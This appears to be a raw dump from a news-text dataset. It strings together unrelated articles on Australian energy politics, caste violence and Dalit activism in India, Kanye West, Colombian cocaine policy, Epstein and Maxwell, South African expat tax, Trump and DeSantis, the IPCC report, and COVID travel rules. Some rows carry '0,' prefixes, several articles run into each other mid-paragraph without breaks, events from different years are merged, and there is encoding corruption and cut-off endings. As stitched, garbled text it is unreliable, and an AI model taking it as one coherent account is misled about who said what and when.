Ms Bishop told Sky News host Paul Murray the fundamental thing which can be done for Australia is to “give us back the cheap power that we used to have for our coal fired power stations”. The federal government has set emerging technologies at the heart of its roadmap to cut Australia’s carbon emissions over the next 30 years. The report pointed to domestic gas, hydrogen, carbon capture and storage and even small-scale nuclear reactors in its transition towards renewable energy. Former Victorian Liberal Party president Michael Kroger said the Labor Party’s response to the report along with statements it made on coal following the 2019 election show how it is “Arthur and Martha” on coal. “They’ve got no idea what day it is in relation to coal,” he said.

0,"The 13-year-old girl has sustained 70% burn injuries and is battling for her life at a private hospital. A 13-year-old Dalit girl in Khammam district of Telangana is battling for her life after she was set on fire allegedly by her employerâs son for resisting his sexual advances. The minor girl has sustained 70% burn injuries. Though the incident took place on September 18, it came to light on Monday after the girl disclosed the incident to her parents. According to the police, the victim, a native of Pallegudem village, Khammam district, was working as a domestic help at the house of Allam Subbarao. On September 18, Subbaroâs son, Allam Maraiah, allegedly tried to rape her. However, as she refused to give in, Maraiah set her on fire and fled from the spot, police said. The victim was then admitted in a private hospital for treatment by Subbaraoâs family, and they tried to bury the incident. A few days ago, the family told the victimâs parents that their daughter suffered injuries while doing work. Her father immediately rushed to the hospital. However, as the victim was in an unconscious state, she could not reveal the crime. Fortunately, the victim regained consciousness on Monday, and shared the entire incident to her father. Subsequently, he filed a complaint with the One Town police station. She reportedly told her father, ""When I was in the room, he came inside and asked me to sleep with him. When I refused, he forced himself on me. I struggled a lot. He tore my clothes and later set me ablaze and ran away from the place."" The One Town Police have registered a case under Sections 376 (punishment for rape), 307 (attempt to murder), 354 (assault or criminal force to woman with intent to outrage her modesty), 506 (Punishment for criminal intimidation) of IPC along with Protection of Children from Sexual Offences Act, 2012. Khammam Police Commissioner Tafseer Iqbal visited the private hospital where the girl is availing treatment and spoke with her parents. The Commissioner informed the media that the accused has already been detained after forming a special team, and that they have made a requisition to the district magistrate to take the dying declaration of the victim.   ©2021 the news minute"
0,"By Fr. Benedict Mayaki, SJ A Jesuit apostolate in the Indian State of Bihar is working in collaboration with a government agency to provide food for thousands of poor people, especially the most disadvantaged among the Dalit communities during the imposed coronavirus lockdown period in India. Manthan, a Jesuit social action center involved in working with the Dalit or ‘untouchables’ in the Hindu caste system, provided food parcels to about 5,000 poor people in Patna, the state capital. They also distributed foodstuff to widows, the elderly and the sick. Fr. Juno Sebastian SJ, the director of Manthan, said that this initiative came about after he was contacted by many people who said that they had not eaten for days. He immediately got in contact with officials of the Indian Railways Catering and Tourism Corporation (IRCTC) who agreed to support his idea to feed the poor. “Now we are distributing cooked meals to 1,500 of them daily, and we will continue until the end of the isolation. We are also working to help 6,500 Musahar families in Patna, for a total of about 40,000 people,” Fr. Sebastian said. The distribution of food takes place in the slums and villages where the Jesuit Provincial of the Patna Province, Father Donald Miranda, SJ, said that they have managed to reach 700 other families. It has also been extended to parts of Uttar Pradesh where about 3,000 families are also able to be fed daily. The Jesuit College of St. Xavier in Patna is also involved in distributing food to about 530 families in the area. Even though the Bihar state government distributes food to the people free of charge, many Dalits do not have access to it because they have no documents to prove where they live or their identity. On 24 March, the Indian government announced a nationwide lockdown as part of precautionary measures to stem the spread of the Covid-19 virus. The lockdown has been hard on the poor and the vulnerable especially the Dalit communities, who are predominantly menial workers in the suburbs of Patna, the capital of Bihar. India presently has 18,658 confirmed cases of coronavirus infections with 592 deaths and 3,273 recovered patients. Pope's Activities Our Faith Useful Information Other sites Our channels"

Nobody really knows the actual answer to that question, but his campaign has begun nonetheless. Things have already gotten off to a rocky start at his first event in Charleston, South Carolina, and now he may be dealing with some very serious problems in his personal life. According to a report from Us Weekly, Kanye’s wife, Kim Kardashian, has begun contacting lawyers about a divorce, after his controversial remarks made at the event and in the following days on his Twitter account. However, Kardashian later made a post on her Instagram page asking for privacy and compassion, and discussing her husband’s mental health issues. His family was reportedly so concerned about his mental health as they were watching the rally, that they wanted to have him committed to a mental hospital immediately after his speech. West made a wide range of controversial remarks at his event, but most upsetting to his family was the revelation that he initially wanted to abort one of their children. West became extremely emotional and broke down into tears during that part in his speech. “My dad wanted to abort me. My mom saved my life. There would’ve been no Kanye West because my dad was too busy,” West said, before shouting, “I almost killed my daughter! I almost killed my daughter!” Photo: AP In the discussion about abortion, West advocated for a strange policy where mothers would be paid $1 million to have a baby, even mothers in other places like Africa, and that Israel should pay the bill. The idea is that it would encourage women to keep their babies without making abortion illegal. Many people noticed that his comments were strangely similar to Donald Trump’s promise to build a wall and make Mexico pay for it. “Everybody that has a baby gets a million dollars or something in that range. We will fund it with other countries. America with other continents. There are Israeli continents that do not believe in this. There are African continents that do not believe in this,” he said.  Kanye West launches bid for presidency From abortion, to civil rights figure Harriet Tubman, Kanye West's rambling speech launched his bid to become president.https://www.itv.com/news/2020-07-20/kanye-west-runs-for-president-with-million-dollar-babies-among-campaign-ideas Posted by ITV News on Monday, July 20, 2020 West made a variety of other strange comments, including that Harriet Tubman never actually freed the slaves, “she just had the slaves go work for other white people.” After getting home from the event, West launched into a tirade on Twitter where he admonished his family for attempting to get doctors to “lock him up.” Many of the posts have since been deleted.  Kanye’s friends were very concerned about his mental health, and he ended up getting some unexpected visits from people like Dave Chappelle. West posted an awkward video on Twitter where he is coaxing Dave Chappelle into telling a joke. https://twitter.com/kanyewest/status/1285627821424087040 Elon Musk also reportedly talked to West and said that “He seems like he’s doing fine.” West has been very public about his struggle with bipolar disorder. In 2016, he spent time in the hospital after a ‘psychiatric emergency’ in the middle of a tour that forced him to cancel 21 shows.

Horowitz could have had a job at one of the top media organizations in the United States, but when working as an intern, he found that the journalists in the newsroom were confined by the anxieties and sensibilities of their bosses. Horowitz loved journalism, but wanted more freedom to pursue more complex topics than you would find on the evening news. Around the same time, he began to notice that there was a growing number of independent journalists developing followings online by sharing their in-depth analysis of advanced or off-beat topics. It wasn't long before Horowitz quit his internship with a large New York network to begin publishing his own material online. Published on By This article was originally published On Dec 3, 2020 Colombia is one of the most notorious producers of cocaine in the world, despite the fact that the country has gone to great lengths in hopes of diminishing the trade of the drug trade within its borders. Now, some members of the Columbian government are proposing a new approach. They are calling for the drug to be legalized and for the government to take control of the industry for themselves. In a new bill first proposed earlier this year, senators Iván Marulanda and Feliciano Valencia call for the Colombian government to take total control of the cocaine industry to bolster public funds and cut violent cartels out of the trade. In a recent interview with VICE, Marulanda explained that the government would purchase coca at market price from the 200,000 farming families that are believed to be involved in the trade. Columbia is considering a bill that makes the government buy up and sell the country’s cocaine production. HOLY. SHIT. So instead try to stamp out drugs, Columbia tries to take control of the trade and regulate the problem? https://t.co/8SBmE45dmX — Jason Ng (@ByJasonNg) December 2, 2020  The senators argued that it would actually be cheaper for authorities to buy the crop from the farmers than it would for them to destroy their crops. It costs the government roughly $1 billion every year to destroy coca crops, while it would only cost about $680 million to buy it. “The thing is, we have to recover control over the state. We’re losing control of the state to corruption, narcos in politics. They’re in municipalities, in departments and in congress. All the way to the highest echelons of government,” Marulanda explained. From here, the state would supply cocaine to users and research groups looking to study its use for painkillers, but it would not be sold recreationally. However, cocaine use is already legal in Columbia, after a court ruled that personal consumption was a human right. Marulanda is not sure if his bill will make an impact, or how long it will take to gain traction, but he is hoping to make it a major election issue in 2022. ‘The first big obstacle is to open up the conversation among public opinion. This has been a giant taboo. Colombians are born and raised under this assumption that drug-trafficking is a war. There’s no information about coca and cocaine. So, with this bill we hope to open the conversation,” he explained.  In recent years, the government has stepped up their military-police-style enforcement of the industry, and yet cocaine production continues to grow in the country. Coca cultivation reached 212,000 hectares last year, a rise of nearly 2% from 208,000 hectares the year before, according to figures released by the White House in March. Potential pure cocaine production, meanwhile, rose to 951 metric tons, an 8% increase, according to the Associated Press. “It’s pretty remarkable that they manually eradicated 100,000 hectares last year and didn’t move the needle,” Adam Isacson of the Washington Office on Latin America think tank said earlier this year. “I guess it means replanting has at least kept pace.” It seems that no matter what the government does, the cocaine keeps on coming, so politicians are willing to try things that may drastic. However, as Marulanda pointed out in his interview with Vice, cutting out the criminal middlemen will reduce the violence seen in the country’s drug war, and also make the drug safer for the people who use it. UPDATE: Historic win for coca/cocaine regulation Bill in Colombian Senate – 22nd April 2021 Published on By It is well-known that the late pedophile Jeffrey Epstein kept detailed records of all the powerful people that he stayed in contact with. There is a notorious “little black book” that was published by Gawker in 2015, which exposed many of the powerful people in his circle. This book is believed to contain the contacts that he most frequently called around 2004 and 2005. However, a new list of contacts, recently published by The Insider, reveals new names that were friends with Epstein in the 1990s. The new black book has the names of 349 people, many of whom did not appear in the list that was previously released to the public. Among the names on the list are Suzanne Ircha, who’s married to Woody Johnson, owner of the New York Jets, famous wall street investor Carl Icahn, supermarket owner John A. Catsimatidis, actress Morgan Fairchild, former New Republic owner Marty Peretz; and Cristina Greeven, the wife of CNN anchor Chris Cuomo. The new black book was made public through a strange twist of fate. A woman initially found the book in the late 1990s and saved it for many years until she finally sold it on eBay.  Denise Ondayko, the woman who found the book, said she was walking down Fifth Avenue in the mid-’90s when she spotted a black address book on the ground. She said that she didn’t realize it was Epstein’s book at the time, because he was pretty much unknown to the public, but she did realize that it had a lot of famous names and figured that it might be worth something, so she held onto it. Last year, Ondayko was cleaning out an old storage unit where she was keeping some of her things and she stumbled upon the book. Now that Epstein was all over the news, the information contained in the book was much more obvious to identify. Ondayko said she reached out to everyone in the media that she could, including John Oliver, Rachel Maddow, and The New York Times, but none of them ever got back to her, so she eventually just put it up for sale on eBay. The buyer was Chris Helali, an aspiring politician from Vermont. He purchased the book for $425.  Helali also tried reaching out to the media, including journalists that were already reporting on Epstein, but none of them seemed interested. Finally, Nick Bryant, the reporter who wrote the original Gawker black book story forwarded the book to the Insider who decided to publish. Insider hired Dennis Ryan, a former forensic document examiner and laboratory supervisor for the Nassau County Police Department, to verify the authenticity of the book. Ryan says that the book is definitely from the late 90s, and many of the dates and addresses match up perfectly with Epstein’s properties and known contacts at the time. The Insider also reached out to dozens of contacts listed in the book who had never previously been publicly associated with Epstein. Fourteen acknowledged on the record that they knew or had met Epstein in the ’90s. There are over 120 names that appear in both books, including Donald Trump and Bill Clinton. Some of the other names included, Steve Rattner, Beth Anne Bovino, Dominique Bluhdorn, Jill Harth, Ted Field, Robert Nunnery, Stanley Shopkorn, Steve Ruchevsky, Ellen Susman, William and Ann Nitze, Les Gelb, Ron Daniel, Sandy Warner, Cyril Fung, Marius Fortelni, Michael Cutlip. Many of these names aren’t necessarily famous, but they are very powerful people in business and finance. The address book is now available in a searchable database on the Insider, but it is unfortunately hidden behind a paywall.  Published on By Last week, former actor Bill Cosby was released from prison on a technicality, despite the fact that he admitted to drugging and assaulting multiple women, and was accused by many others. After his release, legal experts warned that the ruling could set a dangerous precedent that attorneys in similar cases would use to get their clients released as well. Now, just a week later, Ghislaine Maxwell’s lawyers are arguing that she should have her case thrown out on the same grounds, according to The Guardian. Cosby was released because the prosecutor involved initially didn’t press any charges, and claimed that Cosby would not be facing any legal trouble, so when Cosby later confessed, his confession was called into question and no longer admissible in court. The judge also ruled that Cosby had no chance of a fair trial because evidence that was not admissible was so freely available in the media that the jury was unable to make a judgment without considering those facts. Photo: AP Maxwell’s case is similar because the first time that Epstein was arrested for human trafficking, he was given a sweetheart deal by Alex Acosta, a friendly prosecutor. The deal helped Epstein avoid any serious jail time, but it also gave him and his associates legal protection from being held accountable for any future crimes. Obviously, it is not possible to shield a criminal from the consequences of actions that they will take in the future, so Epstein was arrested again many years later after it was discovered that he continued his crimes long after his initial arrest. If Epstein and his friends did have any kind of immunity from that deal, it ended when they continued to commit crimes after the deal was made. Still, Maxwell’s lawyers are optimistic after Cosby’s recent release.  “The government is trying to renege on its agreement and prosecute Ms Maxwell over 25 years later for the exact same offenses for which she was granted immunity,” Maxwell’s lawyers wrote in a statement to Judge Alison Nathan. However, the judge has previously ruled that the deal did not apply to the current case. In an opinion piece for the New York Daily News, Maxwell’s attorney David Oscar Markus wrote that releasing Bill Cosby from prison was the right decision, and that Ghislaine Maxwell should be released as well. Markus argued that prosecutors should have to keep the promises that they make to suspects, because people will sometimes incriminate themselves if they think they have immunity. However, many times prosecutors are corrupt and make promises that are against the best interests of the public, as we saw in Jeffrey Epstein’s first “sweetheart deal” with Alex Acosta while he was district attorney in Southern, Florida. Prosecutors are lawyers, they aren’t the judge and jury, and they shouldn’t hold this much power in a case this serious. Judge Alison Nathan has not yet responded to the recent request, but she did condemn the recent opinion piece that was published by her lawyers in the New York Daily News earlier this week.

Educate, Agitate, Organize Author – Dr Amritpal Kaur Although Punjab has a rich tradition of literature, the entire genre of identity literature is blind to gender and has strongly refused to engage with Dalit women. If we carefully observe, we realize that this missing of gender is systematic and innate in the understanding of Dalit assertion. The Dalit assertion is the assertion of a man and is most noticeable in Punjabi songs like putt chamaaran de (sons of chamaars) which is blatantly masculine. Blocking of gender in historical context has made Dalit women of Punjab almost invisible in literature as well. Sant Ram Udasi and LAL Singh Dil remain the icons of social protest, who have tried to express the silent pain and humiliation of their women through their poems. A passage from Sant Ram Udasi’s long poem titled ‘Abode of the Labourers’ is as below:- “Where all the roads are shut Where the dove is beset by crows Where unwed girls become mothers Where daughters sigh in grief Keep shining, O bright sun, on the abode of labourers.” Omprakash Ghaso’s novel Mitti da Mul (the worth of soil) holds a special place in Dalit Punjabi literature for producing the first Dalit female protagonist (fictitious) of Punjab, Mindo Bazigarni who dares the Jat Sikh landlord for his promiscuous offer of collecting fodder from his farm. This novel was later in the 1980s turned into a play by Gursharan Singh, a Punjabi play writer. In fact, it was in his plays that Punjabi Dalit women protagonists made their entry into public theatres which created a large female audience and gave them a chance to get out of their private spaces into public spheres. Mindo Bazigarni, Sheelo Ghumiyaran, Surjit Kaur Sarpanchni are SHE Heroes in Dalit bastis. Women mobilized in big numbers for these late evening cultural performances. Gurdial Singh in Anne Ghode da Daan (alms for the blind horse), succeeds in conveying the humiliation seethed by a Dalit woman after she returns to the four walls of her crumbling house from the fields where she had to hear insults for a few stalks of mustard from the landlord. Later on she walks out in the blind streets in the middle of the night to avoid what she feels as suffocation. Dalip Kaur Tiwana, a non-Dalit, writes in her novel, Eho Hamara Jiwana (this our life) that a poor Dalit woman has no kith or kin, once they are sold (even for a little money) she lives in an island of the social outcaste, even in the small village she belongs to none. Socially and individually, she doesn’t exist, only floats. Female Dalit singers of Punjab have also suffered the same fate of exclusion from the mainstream entertainment. Folk legendary singer Narinder Bina gave a tough competition to upper caste female singers of her time like Surinder Kaur and Gurmeet Bawa. It is said that Narinder Biba was a far better singer in qualitative terms than her competitors but was given fewer opportunities in terms of technology. Bibi Nooran was another prolific Sufi singer of Punjab with a mesmerizing and powerful voice. Owing to patriarchal society and extreme poverty she wasn’t allowed to pursue her career in singing but few of her songs available today are still matchless and captivating. None of the present-day singers, both male and female belonging to upper castes, stand a chance in matching their powerful voices. Swaraj Nooran, daughter of Bibi Nooran, followed her mother’s dream, despite strong opposition from family and society. Her daughter’s, popularly known as Nooran sisters, have created a mark for themselves in the Punjabi music industry which is male and Jat oriented. Another promising singer Ginni Mahi, has been able to make her presence felt by confidently embracing her identity of a Chamar. She praises Dr B. R. Ambedkar and Guru Ravidas through her revolutionary songs. Amrita Pritam, Ajit Kaur, Sujhwinder Amrit and many more women writers from Punjab have successfully expressed the feelings of humiliation, inferiority, anguish, love, desire, in their writings but none could touch the humiliation caused by the intersection of caste, class and gender. Bahujan Andolan is a socio-cultural political movement in North India. Many Dalit women of Punjab have actively participated from the genesis of movement becoming more than mere cultural participants. Sheela Rani remained active in Majha, Malwa and Doaba regions, Darshna Devi fought assembly elections from Mukerian constituency in 2007 and stood third (earning her the title of Mayawati of Punjab), Nirmala Dasua fought the assembly election from Gardhiwala in 2002, Rachna Devi from Phagwara was the general secretary of BSP, Harvinder Kaur, (daughter of Tajinder Singh Jhalli who was the chief of BAMCEF) participated in historical cycle march of 1984 from Delhi to Jammu along with Kanshiram, Manjinder Kaur from Patiala, Hardev Kaur Shant from Jalandhar and Sawarna Kaur from Balachaur constituency remained the backbone of the political identity of Punjab Dalits have been struggling for upward mobility in caste hierarchy. Many Dalits have been able to shift occupationally from being agricultural labourers to low-income private jobs in beauty salons, private companies and other shops as helpers, waiters, etc. Many are bearing the fruits of reservation, a hard-won right by Babasaheb for his people. The betterment of their economic status has not produced any significant result in their social position as lack of cultural capital is a huge roadblock. The educated Dalit youth is busy in the processes of Sanskritisation and migration. Migration is synonymous with the Punjabi culture despite the fact that Punjab has the most abandoned NRI brides. The NRIs, however, do not contribute to the upliftment of their community but squander their money in expressing newly gained class consciousness. They rejoice in their false pride in being able to spend like Upper caste Jats. In their aspirations for upward mobility and adoption of high-status cultures, educated Dalit women are seen enforcing ideas of development and modernity. Retro modernity is constructed at the outskirts of normative modernity for most of the Dalit community, who lack the purchasing power like the upper castes and cannot engage in consumption to claim modernity like them. They continue to fluctuate between rurality and modernity without being able to belong to either of identities. The educated Dalits blindly emulate the upper caste behaviour adopting more conservative norms around women’s behaviour which upholds female seclusion (dalitisation of patriarchy). Today, the educated and working Dalit women are nothing more than the producers of respectability (respectability hinges on the successful balance between work and home) and status despite being economically productive members of the families. Today, the Dalit women of Punjab are living two lives in extremity. First is the rural life marked by extreme poverty, deprivation, domestic and sexual abuse, crime, addiction, labelled as quarrelsome, vulgar, coarse, devoid of moral sense, sexually promiscuous and complete social exclusion. On the other side as the dutiful daughters and wives engaged in the work of status production. In both cases, they are rendered powerless by the family, society and culture, and their powerlessness is being reproduced by all these social structures. Punjabi Dalit women suffer from systematic silencing and have been widely under-represented in feminist discourses dominated by Jat women. They have no identity of their own and their Dalit identity is actually disempowering. Although they have been silenced in the mainstream, their bodies remember. The bodies of Dalit women of Punjab speak of their minds and memories. Their silent struggles are engraved in the furrows of their wrinkled faces and dried eyes; they only need to be touched upon through human endeavours.

0,"Image via Pexels The National Treasury and the South African Revenue Service (SARS) announced the so-called South African expat Tax in 2017. Image via Pexels South African’s living and working abroad are bracing themselves ahead of the implementation amendments to the Income Tax Act which have been dubbed the expat tax. The National Treasury and the South African Revenue Service (SARS) announced major changes in the tax exemption on South African expatriates as far back as 2017, but the amended legislation takes effect from 1 March 2020. Under the amended legislation, South African tax residents working in other countries will only be exempt from paying tax on the first R1 million they earn abroad. Once an individual crosses the R1 million mark, they will be required by law to pay tax on all foreign earnings. South African tax residents who provide paid services outside of South Africa on behalf of an employer for longer than 183 days during a 12 month period will be granted an exemption. Director at law firm Garlicke & Bousfield, Graeme Palmer explained that the exemption only applies if during the same 12 month period a person rendered services outside South Africa for a continuous period of at least 60 days. “If this criterion is met the resident is exempt from income tax on such foreign income in South Africa,” Palmer is quoted by BusinessTech. “The amendment now provides that a person who meets these requirements will only be exempt from income tax in South Africa up to the first R1 million of their employment income earned abroad.” Palmer explains that the changes in legislation will only affect South African tax residents working abroad not former citizens or long-term expatriates who live and work abroad. In other words, South Africans who have permanently moved abroad will not be subject to double taxation. Such individuals will only need to pay tax in the country where they now live and work. For the law to apply a person would have to be present in South Africa for a certain amount of time through the tax year. “It is important for expatriates to understand that the exemption only applies to South African tax residents working abroad,” Palmer said. “These are persons who are still ordinarily resident in South Africa or have been physically present in South Africa for a statutory specified number of days each year over a five year period. “Expatriates who have been living abroad for many years or who have emigrated are unlikely to be effected by this law. They will only pay tax in the country where they now live and are employed.” Take our survey & stand a chance to WIN R6 000 in cash. CLICK HERE!

0,"President Donald Trump is reportedly furious at one of his allies for taking his advice. According to Vanity Fair's Gabriel Sherman, the president is angry that he can't hold any of his trademark campaign rallies in Florida amid its weeks-long surge in COVID-19 cases. What's more, Sherman's sources say Trump is putting the blame for this predicament at the feet of Gov. Ron DeSantis, who has been eager to follow the president's commands to reopen state economies even as the country records more than 50,000 infections and 1,000 new deaths from the novel coronavirus every day. ""He thinks Ron has made it a lot worse,"" one Republican who spoke with Trump said. Trump was forced to cancel his planned RNC acceptance speech in Jacksonville after public health officials told him there was no way to safely hold a mass gathering in the city without risking mass COVID-19 infection. Nonetheless, one aide tells Sherman that ""rallies are his jam"" and that ""Trump wonâ€™t be happy until he is doing multiple rallies a day."" The novel coronavirus crisis in Florida continues to grow more and more dire. As flagged by Bloomberg News' Steven Dennis, Florida has once again smashed its record for COVID-19 hospitalizations and now has 15,169 residents hospitalized with the disease. Even more alarming is the fact that nearly 47 percent of all intensive care unit beds in the state are being taken up by COVID-19 patients, which Dennis says is the highest percentage in the nation right now. The latest numbers mark a major jump from just two days ago, when Florida reported having 13,793 patients hospitalized with COVID-19. Republican Gov. Ron DeSantis has so far completely refused to enact any measures that could possibly slow down the spread of the disease and has even threatened to withhold pay from school administrators who want to implement mask mandates for students and faculty. Texas Gov. Greg Abbott, who has similarly banned school districts from enforcing mask or vaccination requirements, is now asking hospitals to postpone all elective surgeries while he looks for out-of-state health workers who can help his state cope with the deadly pandemic. Earth has warmed 1.09â„ƒ since pre-industrial times and many changes such as sea-level rise and glacier melt are now virtually irreversible, according to the most sobering report yet by the Intergovernmental Panel on Climate Change (IPCC). The report also found escape from human-caused climate change is no longer possible. Climate change is now affecting every continent, region and ocean on Earth, and every facet of the weather. The long-awaited report is the sixth assessment of its kind since the panel was formed in 1988. It will give world leaders the most timely, accurate information about climate change ahead of a crucial international summit in Glasgow, Scotland in November. The IPCC is the peak climate science body of the United Nations and the World Meteorological Organization. It is the global authority on the state of Earth's climate and how human activities affect it. We are authors of the latest IPCC report and have drawn from the work of thousands of scientists from around the world to produce this new assessment. Sadly, there is hardly any good news in the 3,900 pages of text released today. But there is still time to avert the worst damage, if humanity chooses to.  For the first time, the IPCC states unequivocally â€” leaving absolutely no room for doubt â€“ humans are responsible for the observed warming of the atmosphere, lands and oceans. The IPCC finds Earth's global surface temperature warmed 1.09â„ƒ between 1850-1900 and the last decade. This is 0.29â„ƒ warmer than in the previous IPCC report in 2013. (It should be noted that 0.1â„ƒ of the increase is due to data improvements.) Read more: Monday's IPCC report is a really big deal for climate change. So what is it? And why should we trust it? Trump-loving podcaster and right-wing activist Charlie Kirk on Tuesday said that America's founders would have launched a military strike against ""Drag Queen Story Hour"" events if such things existed in the late 18th century. In his podcast, Kirk sought to dispel what he called ""lies"" about America's founders and their tolerance for what Kirk considers to be sexual deviancy. ""One of the lies about the founding fathers is that they were strictly small-l libertarians,"" he said. ""And that's just not true... For example, let me just tell you this: If Alexander Hamilton, Thomas Jefferson, George Washington, or John Adams saw drag queen story hour, they would mobilize the Minutemen."" It is unclear what about transgender people reading stories to children would require a military response, but Kirk insisted that such an attack would have been within the framers' conception of human liberty.

0,"A woman sarpanch from the Dalit community in Jammu and Kashmir’s Kishtwar district has resigned from her post alleging discrimination against her by upper-caste Hindu members of the Poochal Block Development Committee (BDC). Speaking to The Kashmir Walla, sarpanch Kamlesh Kumari said that she was consistently disrespected for her identity as a Dalit. “All the people in there [BDC] who are upper caste including some panches, DC, chairman, disrespected me, [taunted me by] calling me Dalit,” she alleged. In a statement issued earlier, Ms. Kumari stated that she resigned “after bearing brunt of atrocities and hatred based discrimination by upper-caste Hindus particularly towards schedule caste and finding no safeguards from the caste-based ruling elite coupled with stigmas inflicted upon the undersigned and my family by the upper caste Hindus i.e.; Block Developmental chairman Kishtwar Shri Suresh Sharma, BDO Kishtwar Shri Sheetal Sharma, JE (Junior Engineer, RDD Block) Kishtwar Shri Vijay Parihar and also in view of sustained life threats to me and my family and outgoing burnt of caste-based hatred and corruption in the system in Jammu and Kashmir (UT) in general and District Kishtwar, in particular, I am going to resign from my services as Sarpanch today on and therefore I cease to be Sarpanch with immediate effect.” Ms. Kumari said that matters became worse after she objected to alleged corruption in the BDC. “For the past 5-6 months, I have been speaking out against corruption. My panches were paid less money,” she said. “When I filed an FIR against the chairman for enquiry, all of them (upper-caste Hindu men) came together and started threatening me.” Following the alleged threats, Ms. Kumari said that she is worried about her and the family’s safety. “My kids and my husband are also worried. From last one month, I have not been able to go anywhere because they were threatening me and then I thought resignation is the best option,” she said. Ajit Bhagat, Ms. Kumari’s husband, accused the JEPD chairman’s involvement in the corruption within the panchayat, particularly in the disbursement of wages under the rural employment generation scheme. Mr. Bhagat said that the discrimination was not limited to just the Dalit community but Muslims as well. “When it was time for the payment, there was an upper-caste Junior Engineer,” who, he said. there are two wards [represented by] upper caste Hindus to which they paid 16000 17000 rupees while the three wards by Muslims and Dalits were being paid 2000 and 3000 rupees,” he said. Mr. Bhagat further alleged that this was why Ms. Kumari was harassed. “The upper caste Brahmins tortured [Ms. Kumari],” Mr. Bhagat told The Kashmir Walla. “I can’t even say how much. When she used to walk, they criticized her like kids. This is a dispute from the past 4-5 months.” The BDC chairperson Mr. Sharma, however, denied the allegations against him. “All the accusations are baseless,” he said. “I am BDC chairman of 12 panchayats, we keep an eye on every panchayat. She had no issues with me, she had issues with the panches and the ward members of her village. She has an uncle who is a sarpanches and her sister-in-law who is a panches, they bring their personal issues here. They did not get along with the panches and they are maligning the whole RDE department and the BDC chairman.” Ms. Kumari, in her statement, had also stated that “I am much dedicated towards my work and never surrender before the evil. For the last couple of months, I am continuously pressurized by the BDC chairman Kishtwar namely Suresh Sharma for doing the corrupt practices. But when I categorically refused to indulge myself in corrupt practice as my moral do not allow me to violate the norms of PRI [Panhayati Raj Institution], lateral BDC chairman Kishtwar Suraish Sharma called me in his office in presence of BDO KCSM ishtwar Sheetal Sharma and other panches and curse me on the basis of my caste and use (sic) unparliamentary language to demolish my modesty, even he physically hit me publically and called me as untouchable and the BDO Kishtwar Sheetal Sharma and other officials remain mere spectators. The written complaint had been filed against BDC chairman at Police station Kishtwar and other offices of higher authorities but no stagnant action has been taken yet as the administrative machinery of district Kishtwar work on the mercy of these politically affiliated persons.” Ms. Kumari said that the constant harassment has put “a huge stress” on her resulting in “cardiac disorder”, and “a state of depression” on her family. Through the statement, she has held BDC chairman Suresh Sharma, BJP District President Pardeep Parihar and BDO Kishtwar Sheetal Sharma responsible for in case “I and my family is physically or mentally effected/harmed (sic)”.

As of this week, the Czech Republic wants coronavirus tests for Bulgarian seasonal workers. Denmark allows Bulgarians on its territory only if they have an address registration there, an employment contract or a document certifying a business trip.As of today, people who have visited Bulgaria and Romania in the last 14 days are subject to mandatory quarantine in Italy. In Finland, entry is only for a ""valid reason"".Mandatory home quarantine in Austria, despite a negative PCR test. This is already required for those entering Germany. For the next 14 days, access to southern Romania was denied without good reason. And Greece has tightened measures even more along its land borders. Belgium, Lithuania and Netherlands with Quarantine for Bulgarians From Tuesday, those traveling by plane from Bulgaria to Greece will have to present to the Greek border authorities a negative result from a PCR test for coronavirus, performed up to 72 hours before their entry into our southern neighbor, the Ministry of Foreign Affairs announced. They added that only passengers who have a certificate for such a test will be allowed in the country. It must be issued in English and contain the three names and numbers of the passenger's passport or identity card. The authorities in our southern neighbor will not accept certificates that do not meet these requirements ""Travelers should be tested in the laboratory by RT-PCR by taking secretions from the mouth or nose. Tests for coronavirus will be recognized if they are performed in national reference laboratories, national health laboratories or private laboratories that are accredited by the relevant national accreditation bodies (not necessarily specifically for COVID-19). The measure does not apply to Greek citizens, citizens residing in Greece and travelers for significant professional reasons. The Greek Ministry of Foreign Affairs also announced that on Tuesday, July 28, and Wednesday, July 29, passengers who did not have time to be tested before their trip will be tested by the competent Greek authorities upon arrival in Greece. The requirement for citizens traveling by plane to Greece to fill in at least 24 hours in advance an electronic Passenger Location Form (PLF) generating a QR code, which they present to the Greek authorities upon entering the country, remains in force. More information is published on travel.gov.gr At the moment there is no change in the requirements for crossing the land borders between Bulgaria and Greece. ""Travelers to Greece across the land border, regardless of their citizenship, must also fill in an electronic passenger localization form (PLF) generating a QR code at least 24 hours before arrival,"" the Foreign Ministry explained. The closure of the Ilinden, Kapitan Petko Voyvoda and Makaza checkpoints has increased traffic across the border near Petrich. There are no problems with the transition. There are no queues of trucks. All those waiting go to sea in Greece. Travelers wait about an hour and a half to cross the Tower. Three of the points on the Bulgarian-Greek border are working.

0," Despite the fact that time spent self-isolating at home leaves us with ample time (and incentive) for online retail therapy, there have been several occassions now that we've been warned of the crippling effect that Covid-19 has and will continue to have on the fashion industry in the conming months, and the global economy as a whole. While bigger, more established brands continue to lend their support in these testing times, homegrown sustainable brands have taken upon themselves to help raise funds for the sheer survival of the grassroot level workers. Most of which are finding it difficult to even anticipate where their next meals are coming from. One such example is the initiative by Sudheer Rajbhar of Chamar Studio who has teamed up with Ketto.Org helmed by Mr. Varun Sheth and actor Kunal Kapoor to help artisans of the Dalit Community residing in Dharavi, Mumbai which has recently become a Covid-19 hotspot. Needless to say, the craftsmen and artisans at the Dharavi slums are living in unhygienic conditions with inadequate medical aid and food supplies and this brand is doing everything they can to help them sustain. Social justice is in the brand's DNA, and they have been championing the principles of sustainability by recycling discarded, old rubber tyres into a minimal range of bags. Their talented and closely-knit team of a total of 13 artisans consists of cobblers, leather craftsmen, weavers, stitchers, young creatives and sales associates which also means they are supporting approximately 70 to 80 extended people from artisan's families.     ""CHAMAR Covid-19 relief fund-we have collected over 2.8 lakhs, more than half the amount we need to aid our artisans and keep Chamar Studio running. We are a small business and grateful for your support, which will help sustain the livelihoods of our artisans, creatives and sales associates and their families through this difficult period."" says designer Sudheer. Kunal adds, ""Dharavi, which has been one of the largest manufacturing areas, is now the biggest containment zone red spot. And a lot of the Artisans who live there are in dire need of basic essentials. The pandemic has ruined their livelihood and a little aid from us can help support them. It is the need of the hour...help us help them."" The artisans need: 1. Financial assistance to cover their wages and families wellness2. Medical aid3. Funds to support the resumption of our activities after the lockdown period4.

